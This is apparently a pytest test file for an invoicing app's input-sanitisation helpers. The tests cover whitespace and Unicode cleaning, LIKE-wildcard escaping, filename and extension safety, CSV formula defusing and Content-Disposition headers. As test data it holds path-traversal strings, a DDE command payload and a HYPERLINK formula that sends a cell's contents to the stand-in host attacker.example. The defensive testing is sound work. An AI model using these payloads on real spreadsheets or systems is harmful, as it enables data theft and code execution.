"""Edge cases for the input cleaning applied at the edge.

The interesting inputs here are not "a name with an apostrophe" — SQLAlchemy
binds parameters and that was never a problem. They are the ones that turn a
value into something other than data: a wildcard that makes an indexed search a
full scan, a newline that forges a log line, a filename that walks out of the
upload directory.
"""
from __future__ import annotations

import ast
from pathlib import Path

import pytest

from app.core.sanitize import (
    clean_text,
    content_disposition,
    csv_safe,
    escape_like,
    safe_extension,
    safe_filename,
    search_pattern,
    strip_control_chars,
    without_nul,
)


class TestCleanText:
    def test_none_stays_none(self):
        assert clean_text(None) is None

    def test_a_field_of_only_whitespace_becomes_none(self):
        # Not "" — an empty string in a nullable column means "the user typed
        # nothing", which is what NULL already says, and two spellings of
        # absent break every downstream `is None` check.
        assert clean_text("   \t  ") is None

    def test_runs_of_whitespace_collapse(self):
        # Names pasted out of a PDF carry these, and "ACME  LIMITED" would
        # otherwise be a different counterparty from "ACME LIMITED".
        assert clean_text("ACME   \t  LIMITED") == "ACME LIMITED"

    def test_decomposed_and_composed_spellings_normalise_together(self):
        # The same name typed on two devices must dedupe to one supplier.
        composed = clean_text("Ünïted")
        decomposed = clean_text("Ünïted")
        assert composed == decomposed

    def test_a_bidi_override_is_removed(self):
        # A right-to-left override renders an invoice differently from the one
        # that was approved — a spoof, not a formatting quirk.
        assert clean_text("Acme‮DTL") == "AcmeDTL"

    def test_a_newline_cannot_survive_into_a_logged_value(self):
        assert "\n" not in (clean_text("Acme\nGSTIN: forged") or "")

    def test_a_zero_width_space_is_removed(self):
        assert clean_text("Ac​me") == "Acme"

    def test_length_is_bounded(self):
        assert len(clean_text("x" * 5000, max_length=100)) == 100

    def test_the_default_bound_is_the_one_the_columns_are_sized_for(self):
        """Every caller that omits `max_length` gets this number.

        Passing an explicit bound, as the test above does, leaves the default
        itself unasserted — and the default is what the model columns and the
        API schemas were sized against.
        """
        assert len(clean_text("x" * 5000)) == 500

    def test_truncation_that_leaves_nothing_gives_none(self):
        assert clean_text("    ", max_length=2) is None


class TestStripControlChars:
    def test_newlines_are_kept_when_asked(self):
        assert strip_control_chars("a\nb", keep_newlines=True) == "a\nb"

    def test_newlines_go_by_default(self):
        assert strip_control_chars("a\nb") == "ab"

    def test_a_null_byte_never_survives(self):
        # Reaches a filesystem call in the upload path, where it truncates the
        # path in the C layer.
        assert strip_control_chars("a\x00b", keep_newlines=True) == "ab"


class TestEscapeLike:
    def test_a_bare_wildcard_is_escaped(self):
        # Unescaped, this is a full scan of the tenant's invoices per keystroke.
        assert escape_like("%") == "\\%"

    def test_underscore_is_escaped(self):
        assert escape_like("a_b") == "a\\_b"

    def test_the_escape_character_itself_is_escaped_first(self):
        # If it were not, escaping "\%" would produce "\\%" — a literal
        # backslash followed by a live wildcard.
        assert escape_like("\\%") == "\\\\\\%"

    def test_ordinary_text_is_untouched(self):
        assert escape_like("Northwind Supplies") == "Northwind Supplies"


class TestSearchPattern:
    def test_none_and_blank_mean_no_filter(self):
        assert search_pattern(None) is None
        assert search_pattern("   ") is None

    def test_the_default_bound_keeps_a_pasted_page_out_of_a_like_clause(self):
        """A search term becomes `%term%` against an indexed column.

        The endpoint caps the query parameter at 100 too, but this function is
        the one that has to hold when it is called from anywhere else.
        """
        pattern = search_pattern("x" * 5000)
        assert pattern == "%" + "x" * 100 + "%"

    def test_a_term_is_wrapped_in_wildcards(self):
        assert search_pattern("acme") == "%acme%"

    def test_a_wildcard_in_the_term_is_neutralised(self):
        # The user's "%" must match a literal percent, not everything.
        assert search_pattern("50%") == "%50\\%%"


class TestSafeFilename:
    @pytest.mark.parametrize(
        "attack",
        [
            "../../etc/passwd",
            "..\\..\\windows\\system32\\config",
            "/etc/passwd",
            "....//....//etc/passwd",
        ],
    )
    def test_traversal_never_survives(self, attack):
        result = safe_filename(attack)
        assert "/" not in result
        assert "\\" not in result
        assert ".." not in result

    def test_a_leading_dot_is_stripped(self):
        # ".bashrc" written into a directory listing is at best confusing.
        assert not safe_filename(".bashrc").startswith(".")

    def test_a_normal_name_is_left_readable(self):
        # The point is not to mangle every file — the user has to recognise
        # their own invoice in the list.
        assert safe_filename("Invoice Apr-2024.pdf") == "Invoice Apr-2024.pdf"

    def test_a_newline_cannot_reach_a_content_disposition_header(self):
        assert "\n" not in safe_filename("in\nvoice.pdf")
        assert "\r" not in safe_filename("in\r\nvoice.pdf")

    def test_an_empty_or_missing_name_falls_back(self):
        assert safe_filename(None) == "upload"
        assert safe_filename("") == "upload"
        # Reduces to nothing after cleaning, which is the same case.
        assert safe_filename("...") == "upload"
        assert safe_filename("///") == "upload"

    def test_length_is_bounded(self):
        assert len(safe_filename("x" * 500)) == 120

    def test_unicode_is_replaced_rather_than_rejected(self):
        # A phone that titled the photo in Devanagari should not fail an
        # upload. The name is cosmetic — the stored file is a UUID — so each
        # character becoming "_" is the right trade against refusing the file.
        assert safe_filename("बिल.pdf") == "___.pdf"


class TestSafeExtension:
    def test_a_plain_extension_is_lowercased(self):
        assert safe_extension("INVOICE.PDF") == ".pdf"

    def test_no_extension_gives_empty(self):
        assert safe_extension("invoice") == ""
        assert safe_extension(None) == ""

    def test_a_non_alphanumeric_extension_is_refused(self):
        # ".php:jpg", ".tar.gz " and friends: the stored file keeps its UUID
        # name anyway, so "" is a safe answer rather than a lossy one.
        assert safe_extension("shell.php;jpg") == ""
        assert safe_extension("x.p df") == ""

    def test_a_double_extension_takes_only_the_last(self):
        assert safe_extension("invoice.pdf.exe") == ".exe"

    def test_an_absurdly_long_extension_is_bounded_rather_than_refused(self):
        """The extension is appended to a path, so its length is not cosmetic.

        Truncating keeps it alphanumeric, so the result is still a valid
        extension rather than the "" that a rejection would give.
        """
        assert safe_extension("invoice." + "a" * 400) == "." + "a" * 10


class TestCsvSafe:
    """A trade name that a spreadsheet would run instead of display.

    The CSV exports are opened in Excel — the endpoint says so, and the BOM is
    there for the same reason — and the fields in them come off an uploaded
    invoice, so the content is chosen by whoever sent the invoice.
    """

    @pytest.mark.parametrize("leader", ["=", "+", "-", "@", "\t", "\r"])
    def test_a_formula_leader_is_defused(self, leader):
        assert csv_safe(f"{leader}SUM(A1:A9)") == f"'{leader}SUM(A1:A9)"

    def test_the_dde_payload_is_defused(self):
        # The one that runs a program rather than merely reading the sheet.
        payload = "=cmd|'/c calc'!A0"
        assert csv_safe(payload) == "'" + payload

    def test_the_exfiltration_payload_is_defused(self):
        # Reads the cell beside it and posts it to whoever put this in the name.
        payload = '=HYPERLINK("http://attacker.example/?"&A2,"Open")'
        assert csv_safe(payload).startswith("'=")

    def test_an_ordinary_name_is_untouched(self):
        assert csv_safe("Sharma Traders Pvt Ltd") == "Sharma Traders Pvt Ltd"
        assert csv_safe("29ABCDE1234F1Z5") == "29ABCDE1234F1Z5"
        # Only the *first* character starts a formula.
        assert csv_safe("A=B Enterprises") == "A=B Enterprises"

    def test_empty_and_none_give_empty(self):
        assert csv_safe(None) == ""
        assert csv_safe("") == ""

    def test_the_value_is_not_edited_only_prefixed(self):
        """Nothing is dropped, so the register still says what the invoice said.

        Truncating or stripping would silently corrupt a supplier's name; one
        visible apostrophe is recoverable by anyone reading the file back.
        """
        assert csv_safe("-Trading Co")[1:] == "-Trading Co"


class TestEveryLikeInTheProductDeclaresItsEscape:
    """The pairing ``escape_like`` depends on, enforced over the source.

    :func:`app.core.sanitize.escape_like` prefixes ``%`` and ``_`` with a
    backslash, and that backslash means nothing to SQL unless the comparison
    says so: ``ilike(pattern, escape="\\\\")``. Get the pattern right and omit
    the ``escape=`` and the escaping is worse than absent — the search now
    looks for a literal backslash that the user never typed, so a supplier
    named "A_B" stops being findable at all, and the ``%`` the escaping was
    there to defuse goes back to being a wildcard.

    That pairing lives in a docstring today and is kept by two call sites
    remembering it. A third endpoint with a search box is the likely next
    change to this codebase, and nothing would fail if it forgot. So this is a
    sweep over the assembled source rather than a test of any one route, for
    the same reason the tenancy contract is a sweep over the assembled route
    table: per-router habit is not a thing a test can rely on.
    """

    @staticmethod
    def _like_calls() -> list[tuple[str, int, ast.Call]]:
        found: list[tuple[str, int, ast.Call]] = []
        for path in sorted((Path(__file__).resolve().parents[1] / "app").rglob("*.py")):
            tree = ast.parse(path.read_text(encoding="utf-8"))
            for node in ast.walk(tree):
                if (
                    isinstance(node, ast.Call)
                    and isinstance(node.func, ast.Attribute)
                    and node.func.attr in {"like", "ilike", "not_like", "notilike"}
                ):
                    found.append((path.name, node.lineno, node))
        return found

    def test_the_sweep_finds_the_calls_it_is_meant_to_police(self):
        # Without this the whole class passes by finding nothing — which is
        # exactly what a rename of `ilike` or a move of the routers would do.
        calls = self._like_calls()
        assert len(calls) >= 5, f"the LIKE sweep found only {len(calls)} calls; it has gone blind"

    def test_no_like_comparison_omits_its_escape_character(self):
        offenders = [
            f"{name}:{lineno}"
            for name, lineno, node in self._like_calls()
            if not any(kw.arg == "escape" for kw in node.keywords)
        ]
        assert offenders == [], (
            "these LIKE comparisons do not declare an escape character, so the "
            "backslashes escape_like puts in the pattern are searched for "
            "literally: " + ", ".join(offenders)
        )

    def test_the_escape_declared_is_the_one_escape_like_uses(self):
        # A different character silently un-escapes the pattern just as
        # completely as omitting it, and reads as correct.
        wrong = [
            f"{name}:{lineno}"
            for name, lineno, node in self._like_calls()
            for kw in node.keywords
            if kw.arg == "escape"
            and not (isinstance(kw.value, ast.Constant) and kw.value.value == "\\")
        ]
        assert wrong == [], (
            "these LIKE comparisons declare an escape character other than the "
            "backslash escape_like emits: " + ", ".join(wrong)
        )


class TestContentDisposition:
    """The header value that tells a browser to save the response as a file.

    A filename that contains a double-quote or a backslash breaks out of the
    quoted ASCII fallback; one with non-ASCII characters needs the RFC 5987
    ``filename*`` parameter or the browser invents a name.
    """

    def test_a_normal_ascii_filename(self):
        hdr = content_disposition("gstr1_27AAPFU0939F1ZV_042026.json")
        assert hdr.startswith("attachment; ")
        assert 'filename="gstr1_27AAPFU0939F1ZV_042026.json"' in hdr
        assert "filename*=UTF-8''" in hdr

    def test_a_double_quote_is_escaped_in_the_ascii_fallback(self):
        hdr = content_disposition('file"name.pdf')
        assert 'filename="file\\"name.pdf"' in hdr

    def test_a_backslash_is_escaped_in_the_ascii_fallback(self):
        hdr = content_disposition("file\\name.pdf")
        assert 'filename="file\\\\name.pdf"' in hdr

    def test_non_ascii_characters_are_percent_encoded_in_filename_star(self):
        hdr = content_disposition("बिल.pdf")
        assert "filename*=UTF-8''" in hdr
        assert "%E0%A4%AC" in hdr

    def test_both_parameters_are_always_present(self):
        hdr = content_disposition("report.csv")
        assert "filename=" in hdr
        assert "filename*=" in hdr


class TestWithoutNul:
    """PostgreSQL refuses U+0000 in text and in JSON; nothing else is touched."""

    def test_nul_is_removed_from_a_string_and_nothing_else_is(self):
        assert without_nul("a\x00b\tc\n\u202e") == "ab\tc\n\u202e"

    def test_it_reaches_into_nested_json(self):
        doc = {"items": [{"description": "Ch\x00air", "qty": 2}], "note": None}
        assert without_nul(doc) == {"items": [{"description": "Chair", "qty": 2}], "note": None}

    def test_non_text_passes_through(self):
        assert without_nul(None) is None
        assert without_nul(42) == 42
